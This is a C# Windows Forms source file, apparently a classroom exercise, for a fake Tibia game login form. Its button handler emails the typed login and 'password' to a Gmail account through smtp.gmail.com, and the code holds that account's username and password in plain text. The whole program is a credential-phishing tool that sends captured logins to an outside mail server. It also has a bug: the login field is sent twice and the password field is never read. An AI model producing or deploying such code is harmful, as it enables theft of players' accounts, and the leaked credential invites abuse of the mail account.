using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tibia
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            MailMessage mail = new MailMessage("gigancihacking@gmail.com", "gigancihacking@gmail.com");
            /* First create object that implements MailMessage class.
             * Pass the name of the sender and recipient to the constructor (we will send the password to ourselves for security) */

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            /* Create SMTP client.
            SMTP (Simple Mail Transfer Protocol) – communication protocol that describes
            method of transfering emails in the Internet
            SMTP is simple, text protocol, which determine
            at least one recipient (in majority of cases it is verified if they exists)
            and then transfer message content */
            
            client.Credentials = new NetworkCredential("gigancihacking@gmail.com", "giganci123");
            //login and password is required to send email form our gmail account

            client.EnableSsl = true;
            //enable SSL, so the email is encrypted, tell students about SSL

            mail.Subject = "Tibia";
            mail.Body = "Login: " + txtLogin.Text + " Password: " +txtLogin.Text;
            //add email title and content

            client.Send(mail);
            //send email
        }
    }
}
